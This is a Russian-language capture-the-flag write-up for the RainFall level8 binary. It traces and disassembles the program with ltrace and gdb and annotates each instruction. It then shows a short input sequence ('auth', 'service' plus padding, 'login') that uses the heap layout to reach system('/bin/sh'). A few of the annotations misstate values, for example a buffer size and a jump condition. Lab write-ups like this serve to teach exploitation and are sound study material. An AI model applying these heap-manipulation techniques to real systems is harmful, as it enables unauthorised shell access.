# Объяснение

1. Анализируем поведение программы

level8@RainFall:~$ ./level8 
(nil), (nil) 
^C
level8@RainFall:~$ ./level8 aaaa 
(nil), (nil) 
aaa
(nil), (nil) 
^C
level8@RainFall:~$ ltrace ./level8 
__libc_start_main(0x8048564, 1, 0xbffff804, 0x8048740, 0x80487b0 <unfinished ...>
printf("%p, %p \n", (nil), (nil)(nil), (nil) 
)                                = 14
fgets(

Программа выводит значения двух указателей, которые изначально являются NULL, после чего ожидает ввод от пользователя функцией fgets()

Посмотрим на функции, вызовые в программе:

All defined functions:

Non-debugging symbols:
0x080483c4  _init
0x08048410  printf
0x08048410  printf@plt
0x08048420  free
0x08048420  free@plt
0x08048430  strdup
0x08048430  strdup@plt
0x08048440  fgets
0x08048440  fgets@plt
0x08048450  fwrite
0x08048450  fwrite@plt
0x08048460  strcpy
0x08048460  strcpy@plt
0x08048470  malloc
0x08048470  malloc@plt
0x08048480  system
0x08048480  system@plt
0x08048490  __gmon_start__
0x08048490  __gmon_start__@plt
0x080484a0  __libc_start_main
0x080484a0  __libc_start_main@plt
0x080484b0  _start
0x080484e0  __do_global_dtors_aux
0x08048540  frame_dummy
0x08048564  main
0x08048740  __libc_csu_init
0x080487b0  __libc_csu_fini
0x080487b2  __i686.get_pc_thunk.bx
0x080487c0  __do_global_ctors_aux
0x080487ec  _fini


Похоже, что основаная часть описана в main.

# Дизассемблируем:

(gdb) disas main 
Dump of assembler code for function main:
   0x08048564 <+0>:     push   %ebp			 // пролог (сохранение адреса указателя на начало фрейма функции из регистра ebp предыдущего фрейма, записав его на стек)
   0x08048565 <+1>:     mov    %esp,%ebp		 // регулировка EBP с предыдущего фрейма на текущий (текущее значение ESP).
   0x08048567 <+3>:     push   %edi			 // сохраняем регистры EDI
   0x08048568 <+4>:     push   %esi		         // и ESI
=> 0x08048569 <+5>:     and    $0xfffffff0,%esp		 // устанавливаем вершину стека на 0xfffffff0 (выравнивание стека)
   0x0804856c <+8>:     sub    $0xa0,%esp		 // выделение памяти на стеке под фрейм в размере 160 байт
   0x08048572 <+14>:    jmp    0x8048575 <main+17>	 // переходим к смещению main+17
   0x08048574 <+16>:    nop

main()
prntf("%, %p\n", auth, service)

   0x08048575 <+17>:    mov    0x8049ab0,%ecx		 // инициализация переменной service  
   0x0804857b <+23>:    mov    0x8049aac,%edx		 // инициализация переменной auth
   0x08048581 <+29>:    mov    $0x8048810,%eax		 // запись в EAX управляющей строки "%p, %p\n"
   0x08048586 <+34>:    mov    %ecx,0x8(%esp)		 // запись адреса переменной "service" 3м аргументом в printf
   0x0804858a <+38>:    mov    %edx,0x4(%esp)		 // запись адреса переменной "auth" 2м аргументом в printf
   0x0804858e <+42>:    mov    %eax,(%esp)		 // запись управляющей строки первым аргументом printf
   0x08048591 <+45>:    call   0x8048410 <printf@plt>	 // вызов printf с переданными аргументами

fgets(buffer, 64, stdin)

   0x08048596 <+50>:    mov    0x8049a80,%eax		 // поток стандартный ввод stdin@@GLIBC_2.0 записан в EAX
   0x0804859b <+55>:    mov    %eax,0x8(%esp)		 // передача "stdin" в функцию fgets 3м аргументом
   0x0804859f <+59>:    movl   $0x80,0x4(%esp)		 // считать строку размером 64 байт - 2й аргумент
   0x080485a7 <+67>:    lea    0x20(%esp),%eax		 // Запись в EAX адреса из регистра ESP со смещением +20
   0x080485ab <+71>:    mov    %eax,(%esp)		 // положить на стек регистр EAX (буфер)
   0x080485ae <+74>:    call   0x8048440 <fgets@plt>	 // вызов fgets()
   0x080485b3 <+79>:    test   %eax,%eax		 // Если значение по адресу EAX пустое, то флаг ZF выставляется как 1
   0x080485b5 <+81>:    je     0x804872c <main+456>	 // Если флаг ZF == 1, то переходим по смещению +456
   0x080485bb <+87>:    lea    0x20(%esp),%eax		 // если нет, то запись в EAX адрес ESP со смещением +20 
   0x080485bf <+91>:    mov    %eax,%edx		 // скопировать в регистр EDX значение из регистра EAX 
							    (считанная строка из fgets())
strncmp("auth ", buffer, 5)

   0x080485c1 <+93>:    mov    $0x8048819,%eax		 // Запись строки "auth " в EAX
   0x080485c6 <+98>:    mov    $0x5,%ecx		 // запись 5 в ECX
   0x080485cb <+103>:   mov    %edx,%esi		 // запись адрес строки, полученной со стандартного ввода в регистр ESI 
   0x080485cd <+105>:   mov    %eax,%edi		 // запись в EDI значение EAX
   0x080485cf <+107>:   repz cmpsb %es:(%edi),%ds:(%esi) // Пока счетчик ECX != 0, повтор инструкции побайтового сравнения содержимого регистра EDI ("auth ") и ESI (результат fgets()), при этом  сдвигая указатель строки, считанной fgets() с stdin
   0x080485d1 <+109>:   seta   %dl			 // установить байт со значением 01h (флаг) dl, если *edi > *esi, иначе 00h
   0x080485d4 <+112>:   setb   %al			 // установить байт со значением 01h (флаг) al, eckb *edi < *esi, иначе 00h


   0x080485d7 <+115>:   mov    %edx,%ecx		 // скопировать значение EDX (считанная строка из fgets() в ECX)
   0x080485d9 <+117>:   sub    %al,%cl			 // 
   0x080485db <+119>:   mov    %ecx,%eax		 // скопировать значение ECX (считанная строка из fgets() в EAX)
   0x080485dd <+121>:   movsbl %al,%eax			 // скопировать байт AL, как long в строку EAX

if(!=0)

   0x080485e0 <+124>:   test   %eax,%eax		 // сравнение EAX по маске
   0x080485e2 <+126>:   jne    0x8048642 <main+222>	 // Если не идетично (если не равны строки), то переход на смещение +222

auth = malloc(4)

   0x080485e4 <+128>:   movl   $0x4,(%esp)		 // запись значения 4 на вершине стека (будущий аргумент malloc)
   0x080485eb <+135>:   call   0x8048470 <malloc@plt>	 // вызов malloc c аргументом значения регистра ESP malloc(4)
   0x080485f0 <+140>:   mov    %eax,0x8049aac		 // копия адреса, вернувшегося в результате выполнения malloc, в значение переменной "auth"
   0x080485f5 <+145>:   mov    0x8049aac,%eax		 // копия значения по адресу переменной "auth" в EAX 
   0x080485fa <+150>:   movl   $0x0,(%eax)		 // инициализация нулями по адресу, хранимому в переменной auth

strlen(buffer + 5) - 1 < 30

   0x08048600 <+156>:   lea    0x20(%esp),%eax		 // смещение адреса EAX (буфера) на 32 байта от начала стека ESP
   0x08048604 <+160>:   add    $0x5,%eax		 // добавление (+) 5 в EAX
   0x08048607 <+163>:   movl   $0xffffffff,0x1c(%esp)	 // в стеке со смещением 28 от ESP записывается значение '-1'
   0x0804860f <+171>:   mov    %eax,%edx		 // скопировать значение EAX в EDX (счетчик)
   0x08048611 <+173>:   mov    $0x0,%eax		 // обнуление адреса EAX 
   0x08048616 <+178>:   mov    0x1c(%esp),%ecx		 // установка значения счетчика ECX равное -1 (смещение +28 от ESP)
   0x0804861a <+182>:   mov    %edx,%edi		 // скопировать значение регистра EDX (с буфером) в регистр EDI
   0x0804861c <+184>:   repnz scas %es:(%edi),%al	 // пока не 0 (ECX == -1), ищем байт из регистра AL (0x0) в EDI со смещением ES (+123)
   0x0804861e <+186>:   mov    %ecx,%eax		 // скопировать значение из ECX в EAX (возврат результата strlen)
   0x08048620 <+188>:   not    %eax			 // EAX * -1
   0x08048622 <+190>:   sub    $0x1,%eax		 // вычесть из EAX 1

if(<)

   0x08048625 <+193>:   cmp    $0x1e,%eax		 // сравнить 30 и EAX
   0x08048628 <+196>:   ja     0x8048642 <main+222>	 // перейти на смещение, если меньше main+222

strcpy(auth, buffer + 5)

   0x0804862a <+198>:   lea    0x20(%esp),%eax		 // сместить адрес регистра (буфера) EAX в позицию +32 от ESP 
   0x0804862e <+202>:   lea    0x5(%eax),%edx		 // сместить адрес регистра (данных) EDX в позицию +5 от EAX 
   0x08048631 <+205>:   mov    0x8049aac,%eax		 // скопировать адрес переменной "auth" в EAX
   0x08048636 <+210>:   mov    %edx,0x4(%esp)		 // Скопировать из регистра EDX в стек со смещением 4 от начала стека
   0x0804863a <+214>:   mov    %eax,(%esp)		 // положить указатель на переменную "auth" в начало стека
   0x0804863d <+217>:   call   0x8048460 <strcpy@plt>	 // вызов strcpy c аргументом auth, buffer + 5 (т.к. +202 lea 0x5(%eax),%edx)

strncmp("reset", buffer, 5)

   0x08048642 <+222>:   lea    0x20(%esp),%eax		 // сместить адрес регистра (буфера) EAX в позицию +32 от ESP 
   0x08048646 <+226>:   mov    %eax,%edx		 // скопировать адрес указателя регистра EAX в EDX
   0x08048648 <+228>:   mov    $0x804881f,%eax		 // запись "reset" в EAX для сравнения со stdin
   0x0804864d <+233>:   mov    $0x5,%ecx		 // запись в счетчик ECX значение 5
   0x08048652 <+238>:   mov    %edx,%esi		 // скопировать из EDX в ESI
   0x08048654 <+240>:   mov    %eax,%edi		 // скопировать строку "reset" из EAX в EDI
   0x08048656 <+242>:   repz cmpsb %es:(%edi),%ds:(%esi) // сравниваем строку "reset" со stdin
   0x08048658 <+244>:   seta   %dl			 // установить байт со значением 01h (флаг) dl, если *edi > *esi, иначе 00h
   0x0804865b <+247>:   setb   %al			 // установить байт со значением 01h (флаг) al, eckb *edi < *esi, иначе 00h
   0x0804865e <+250>:   mov    %edx,%ecx		 // скопировать результат strncmp в счетчик ECX
   0x08048660 <+252>:   sub    %al,%cl 			 // вычесть из значения регистра AL значение регистра CL
   0x08048662 <+254>:   mov    %ecx,%eax		 // записать в регистр EAX значение регистра ECX (счетчика)

if (!=0)

   0x08048664 <+256>:   movsbl %al,%eax			// скопировать байт AL в строку EAX
   0x08048667 <+259>:   test   %eax,%eax		// сравнение буфера по маске
   0x08048669 <+261>:   jne    0x8048678 <main+276>	// если не ==, то переходим
   
free(auth)

   0x0804866b <+263>:   mov    0x8049aac,%eax		// скопировать адрес переменной "auth" в EAX
   0x08048670 <+268>:   mov    %eax,(%esp)		// записать в начало стека адрес переменной auth из регистра EAX
   0x08048673 <+271>:   call   0x8048420 <free@plt>	// вызвать функцию free с аргументом auth

strncmp("service", buffer, 5)
   
   0x08048678 <+276>:   lea    0x20(%esp),%eax		// сместить адрес регистра (буфера) EAX в позицию +32 от ESP <_fini+21> <_fp_hw+1>
   0x0804867c <+280>:   mov    %eax,%edx		// скопировать значение EAX в EDX (счетчик)
   0x0804867e <+282>:   mov    $0x8048825,%eax		// скопировать "service" в буфер EAX (статически указано в коде)
   0x08048683 <+287>:   mov    $0x6,%ecx		// установить счетчик ECX = 6
   0x08048688 <+292>:   mov    %edx,%esi		// сравниваемая строка со stdin
   0x0804868a <+294>:   mov    %eax,%edi		// сравниваемая строка "service"
   0x0804868c <+296>:   repz cmpsb %es:(%edi),%ds:(%esi) // сравнить лексикографически строку "service" с буфером ESI
   0x0804868e <+298>:   seta   %dl			// установить байт со значением 01h (флаг) dl, если *edi > *esi, иначе 00h
   0x08048691 <+301>:   setb   %al			// установить байт со значением 01h (флаг) al, eckb *edi < *esi, иначе 00h
   0x08048694 <+304>:   mov    %edx,%ecx 		// скопировать результат strncmp в счетчик ECX
   0x08048696 <+306>:   sub    %al,%cl 			// вычесть из значения регистра AL значение регистра CL
   0x08048698 <+308>:   mov    %ecx,%eax 		// записать в регистр EAX значение регистра ECX (счетчика)

if (!=0)
   0x0804869a <+310>:   movsbl %al,%eax			// скопировать байт AL в строку EAX
   0x0804869d <+313>:   test   %eax,%eax       		// сравнение буфера по маске
   0x0804869f <+315>:   jne    0x80486b5 <main+337>	// если не равно, то переход на смещение +337 

service = strdup(buffer + 7)
   
   0x080486a1 <+317>:   lea    0x20(%esp),%eax		// buffer
   0x080486a5 <+321>:   add    $0x7,%eax		// +7
   0x080486a8 <+324>:   mov    %eax,(%esp)		// положить адрес регистра (buffer + 7) на стек
   0x080486ab <+327>:   call   0x8048430 <strdup@plt>	// сделать дубликат строки
   0x080486b0 <+332>:   mov    %eax,0x8049ab0		// записать возврат strdup в переменную service

strncmp("login", buffer, 5)

   0x080486b5 <+337>:   lea    0x20(%esp),%eax		// сместить адрес регистра (буфера) EAX в позицию +32 от ESP
   0x080486b9 <+341>:   mov    %eax,%edx		// скопировать значение EAX в EDX (счетчик)
   0x080486bb <+343>:   mov    $0x804882d,%eax		// 0x804882d: "login" скопировать в EAX для сравнения
   0x080486c0 <+348>:   mov    $0x5,%ecx		// запись в регистр ECX (счетчик) значение 5
   0x080486c5 <+353>:   mov    %edx,%esi		// скопировать содержимое буфера в ESI 
   0x080486c7 <+355>:   mov    %eax,%edi		// скопировать строку "login" в EDI 
   0x080486c9 <+357>:   repz cmpsb %es:(%edi),%ds:(%esi)// лексикографически сравниваем EDI ("login") и ESI (буфер)   
   0x080486cb <+359>:   seta   %dl			// установить байт со значением 01h (флаг) dl, если *edi > *esi, иначе 00h
   0x080486ce <+362>:   setb   %al			// установить байт со значением 01h (флаг) al, eckb *edi < *esi, иначе 00h
   0x080486d1 <+365>:   mov    %edx,%ecx		// скопировать результат strncmp в счетчик ECX
   0x080486d3 <+367>:   sub    %al,%cl			// вычесть из значения регистра AL значение регистра CL
   0x080486d5 <+369>:   mov    %ecx,%eax		// записать в регистр EAX значение регистра ECX (счетчика)

if (!=0)
   0x080486d7 <+371>:   movsbl %al,%eax			// скопировать байт AL в строку EAX
   0x080486da <+374>:   test   %eax,%eax		// сравнение буфера по маске
   0x080486dc <+376>:   jne    0x8048574 <main+16>	// если не равно, то переход на смещение +16

if (==)
   0x080486e2 <+382>:   mov    0x8049aac,%eax 		// записать адрес переменной "auth" в регистр EAX
   0x080486e7 <+387>:   mov    0x20(%eax),%eax 		// скопировать значение по адресу EAX+32 в EAX
   0x080486ea <+390>:   test   %eax,%eax  		// сравнение буфера по маске
   0x080486ec <+392>:   je     0x80486ff <main+411> 	// если не равно, то переход на смещение +16

   
   0x080486ee <+394>:   movl   $0x8048833,(%esp)	// Entry point!: 0x8048833 - /bin/sh
   0x080486f5 <+401>:   call   0x8048480 <system@plt>	// вызов system("/bin/sh")
   0x080486fa <+406>:   jmp    0x8048574 <main+16>	

fwrite(&"Password:\n", 1, 10, stdout);
   0x080486ff <+411>:   mov    0x8049aa0,%eax		// 0x8049aa0 <stdout@@GLIBC_2.0>:   ""
   0x08048704 <+416>:   mov    %eax,%edx		// скопировать stdout в регистр EAX
   0x08048706 <+418>:   mov    $0x804883b,%eax		// скопировать строку "Password:\n" в регистр EAX
   0x0804870b <+423>:   mov    %edx,0xc(%esp)		// положить в стек edx (stdout)
   0x0804870f <+427>:   movl   $0xa,0x8(%esp)		// положить в стек 10
   0x08048717 <+435>:   movl   $0x1,0x4(%esp)		// положить в стек 1
   0x0804871f <+443>:   mov    %eax,(%esp)		// положить в стек строку "Password:\n"
   0x08048722 <+446>:   call   0x8048450 <fwrite@plt>	// вызвать fwrite() 
   0x08048727 <+451>:   jmp    0x8048574 <main+16>	// перейти к смещению +16 (где лежит функция fgets())

   
   0x0804872c <+456>:   nop
   0x0804872d <+457>:   mov    $0x0,%eax		// очистка буфера
   0x08048732 <+462>:   lea    -0x8(%ebp),%esp		// выравнивание указателя ESP
   0x08048735 <+465>:   pop    %esi
   0x08048736 <+466>:   pop    %edi
   0x08048737 <+467>:   pop    %ebp
   0x08048738 <+468>:   ret    				// выход


# Выводы дизассемллирования

Программа в цикле считывает строку со стандартного ввода функцией fgets((char*)buf, __uint SIZE, stdin)
По смещению main+401 видим вызов функции system c аргементом "/bin/sh". Остается выяснить, как сюда попасть? 

Из дизассемблированного по листингу GDB кода программы видно, что в цикле со считыванием через fgets со stdin есть 5 основных ветвей хода исполнения программы:
1. проверка на поданную строку "auth "
При этом выделяется память для переменной auth 4 байта 
и производится копирование в эту переменную памяти из буфера со смещением в 5 байт 
(вероятно, предполагалось после auth указание имени пользователя)
2. проверка на поданную строку "reset"
если введен reset, то память, выделенная для переменной auth освобождается 
3. проверка на поданную строку "service"
производится дубликат буфера со смещением указателя по нему на +7
4. проверка на поданную строку "login"
самая интересная для нас секция, проваливаемся в следующий уровень ветвления:
4.1 проверка на существующий 32й символ переменной auth, если да, то вызов system("/bin/sh");
4.2 если нет, то вывод Password

Задача синтетическая, но да ладно. 

Как нам попасть в ветку 4.1, если в ветке 1 для переменной auth может быть выделена память объемом только 4 байта?

В ветке 3 есть замечательная функция strdup:
The  strdup()  function returns a pointer to a new string which is a duplicate of the string s. 
Memory for the new string is obtained with malloc(3), and can be freed with free(3).

Она выделяет память на куче и мы можем дописать в переменную auth дополнительно символов. 


# Атака:

(nil), (nil) 
auth 
0x8e829c0, (nil) 
serviceAAAAAAAAAAAAAAAAAAAA
0x8e829c0, 0x8e829d0 
login
$ ls
flag  level8  source.c  walkthrough
